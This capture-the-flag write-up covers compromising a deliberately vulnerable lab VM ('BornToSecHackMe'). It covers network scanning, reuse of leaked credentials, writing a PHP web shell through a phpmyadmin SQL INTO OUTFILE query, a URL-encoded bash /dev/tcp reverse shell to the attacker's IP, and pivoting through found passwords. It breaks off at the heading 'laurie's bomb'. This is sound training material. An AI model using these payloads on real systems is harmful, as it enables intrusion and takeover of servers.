# How to find the IP of the VM ?

We know that the VM is connected through the network interface `enp0s31f6`.

```
nlederge@k0r3p13:~ $ ip a         
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s31f6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether d0:46:0c:85:a3:95 brd ff:ff:ff:ff:ff:ff
    inet 10.11.3.13/16 brd 10.11.255.255 scope global dynamic noprefixroute enp0s31f6
       valid_lft 4253sec preferred_lft 4253sec
    inet6 fe80::baef:a725:fbe8:c5dc/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: wlp0s20f3: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether a8:59:5f:cb:72:99 brd ff:ff:ff:ff:ff:ff
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 12:8b:77:1a:96:9e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: vboxnet0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
```

The IP of the VM will be in the subnet `10.11.3.13/16`. We could scan with nmap the entire subnet to find the VM but we know that VirtualBox machines usually take an IP at the end of the subnet.

```
nlederge@k0r3p13:~ $ nmap -sn 10.11.250-254.0-254
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-15 11:51 +0200
Nmap scan report for 10.11.250.230
Host is up (0.00030s latency).
Nmap scan report for 10.11.250.250
Host is up (0.0041s latency).
Nmap scan report for _gateway (10.11.254.254)
Host is up (0.00038s latency).
Nmap done: 1275 IP addresses (3 hosts up) scanned in 33.16 seconds
```

We have two potential candidates: `10.11.250.230` and `10.11.250.250`. Let's see which ports are open.

```
nlederge@k0r3p13:~ $ nmap 10.11.250.230 10.11.250.250
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-15 11:53 +0200
Nmap scan report for 10.11.250.230
Host is up (0.000027s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap scan report for 10.11.250.250
Host is up (0.0019s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
4321/tcp open  rwhois
7000/tcp open  afs3-fileserver
7100/tcp open  font-service
7435/tcp open  unknown
8008/tcp open  http
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 2 IP addresses (2 hosts up) scanned in 1.06 seconds
```

By opening the `10.11.250.230` in a browser, we can see that it is a web server asking to hack it, confirming our hypothesis.

# Getting a shell on the server

With `gobuster` we can try to find directories and files on the server.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u 10.11.250.230 -w ~/SecLists/Discovery/Web-Content/common.txt                    
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 290]
.hta                 (Status: 403) [Size: 285]
.htpasswd            (Status: 403) [Size: 290]
cgi-bin/             (Status: 403) [Size: 289]
fonts                (Status: 301) [Size: 314] [--> http://10.11.250.230/fonts/]
forum                (Status: 403) [Size: 286]
index.html           (Status: 200) [Size: 1025]
server-status        (Status: 403) [Size: 294]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

The route `forum` is interesting but we get a forbidden access. By using our browser and ignoring the expired TLS certificate, we can access it `https://10.11.250.230/forum`.
We can try again with gobuster but now by ignoring the invalid certificates.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u https://10.11.250.230 -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
cgi-bin/             (Status: 403) [Size: 290]
forum                (Status: 301) [Size: 316] [--> https://10.11.250.230/forum/]
phpmyadmin           (Status: 301) [Size: 321] [--> https://10.11.250.230/phpmyadmin/]
server-status        (Status: 403) [Size: 295]
webmail              (Status: 301) [Size: 318] [--> https://10.11.250.230/webmail/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

It gives us a few interesting directories : `forum`, `phpmyadmin`, `webmail`. `phpmyadmin` and `webmail` ask for credentials, `forum` doesn't.

By browsing the `forum`, we can see that there are multiple posts and specifically one about `Probleme login ?` posted by `lmezard` posting a lot of logs.
There a useful information in the logs :
- The server hostname `BornToSecHackMe` is revealed.
- `lmezard` is a valid user account and scheduled cron jobs.
- `admin` is also a valid account and has sudo access.
- The string `!q\]Ej?*5K5cy*AJ` is entered in the login field, probably an accidental pasted string.

We can login to the forum with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`. When trying to send an email to the admin account, our mail appears as the sender email `laurie@borntosec.net`. We can login to the webmail with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`.

An email sent by `qudevide` to `lmezard` says :

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

With these credentials `root` : `Fg-'kKXBj87E:aJ$`, we can login to the phpmyadmin database and see the databases.
We can execute SQL queries to create files on the server, let's try to create a shell.php file in the forum directory to try to create a reverse shell. The issue is that we can't write directly in the '/var/www/forum' directory, we need to find another directory to write the file.

Let's enumerate the subdirectories with `gobuster`.
```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ gobuster dir -u https://10.11.250.230/forum/ -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230/forum/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 297]
.htaccess            (Status: 403) [Size: 297]
.hta                 (Status: 403) [Size: 292]
backup               (Status: 403) [Size: 294]
config               (Status: 403) [Size: 294]
images               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/images/]
includes             (Status: 301) [Size: 325] [--> https://10.11.250.230/forum/includes/]
js                   (Status: 301) [Size: 319] [--> https://10.11.250.230/forum/js/]
lang                 (Status: 301) [Size: 321] [--> https://10.11.250.230/forum/lang/]
modules              (Status: 301) [Size: 324] [--> https://10.11.250.230/forum/modules/]
index.php            (Status: 200) [Size: 4935]
index                (Status: 200) [Size: 4935]
templates_c          (Status: 301) [Size: 328] [--> https://10.11.250.230/forum/templates_c/]
themes               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/themes/]
update               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/update/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

After trying all the possible directories, we can write the shell.php file in the `templates_c` directory, phpmyadmin gives us a successful response.
```
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

We can now access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=id`.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's start a reverse shell with bash. We need to execute the following command in the server : `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` as `10.11.3.13` is our IP and `4444` is the port we will use to receive the shell. For it to pass it trough the php script, we need to use the `?c=` parameter and URL encode the command.

We pass `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` to a website like `www.urlencoder.org` and we get the encoded command. Our payload will be `?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.

We will be using `penelope` to have a fully functionnal and interactive reverse shell.

```
git clone https://github.com/brightio/penelope.git
cd penelope
chmod +x penelope.py
```

And we launch it with the following command : `python3 penelope.py -p 4444`. Then we access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.

We have our shell :

```
nlederge@k0r3p13:work/penelope ‹main›$ python3 penelope.py 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.11.3.13 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from BornToSecHackMe~10.11.250.230-Linux-i686 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/nlederge/.penelope/sessions/BornToSecHackMe~10.11.250.230-Linux-i686/2025_10_15-17_24_57-715.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
www-data
www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@BornToSecHackMe:/var/www/forum/templates_c$
```

# Following the breadcrumbs

In the directory `/home`, there is a directory `LOOKATME` which contains a file password.

```
www-data@BornToSecHackMe:/home$ cat /home/LOOKATME/password 
lmezard:G!@M6f4Eatau{sF"
```

With these credentials `lmezard` : `G!@M6f4Eatau{sF"`, we can login to the user `lmezard` with the following command : `su lmezard`.

```
www-data@BornToSecHackMe:/home$ su lmezard
Password: 
lmezard@BornToSecHackMe:~$ id
uid=1001(lmezard) gid=1001(lmezard) groups=1001(lmezard)
lmezard@BornToSecHackMe:~$
```

## lmezard's fun

In the home directory there is a `README` file which contains this text referencing the file `fun`.

```
lmezard@BornToSecHackMe:~$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

It is an archive containing a lot of `pcap` files each containing part of a `c` program. Since we can't `scp` to our machine directly, we need to find another way. We can use the `ftp` service with the credentials `lmezard` : `G!@M6f4Eatau{sF"` to download the file `fun`.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ ftp 10.11.250.230
Connected to 10.11.250.230.
220 Welcome on this server
Name (10.11.250.230:nlederge): lmezard
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||6216|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||59534|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***********************************|   790 KiB  163.41 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (153.40 MiB/s)
ftp> exit
221 Goodbye.
```

We can then unpack the file `fun` and see the `pcap` files.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ tar -xvf fun     
ft_fun/
ft_fun/C4D03.pcap
ft_fun/GKGEP.pcap
ft_fun/A5GPY.pcap
ft_fun/K8SEB.pcap
ft_fun/PFG98.pcap
ft_fun/U89WD.pcap
...
```

Each `pcap` file contains part of a `c` program. We can concatenate them all to get the complete program following the comments indicating the order of the files, i.e. `//file443`.
For this, we will use our script `concatenate_fun.py`, compile the program and run it to get the password.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ python3 scripts/concatenate_fun.py
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ cc combined_fun.c && ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
```

It asks us to SHA-256 the password before submitting it.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ echo -n Iheartpwnage | sha256sum 
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

Now we can ssh to `laurie` with the password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ ssh laurie@10.11.250.230
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@10.11.250.230's password: 
laurie@BornToSecHackMe:~$ id
uid=1003(laurie) gid=1003(laurie) groups=1003(laurie)
```

## laurie's bomb
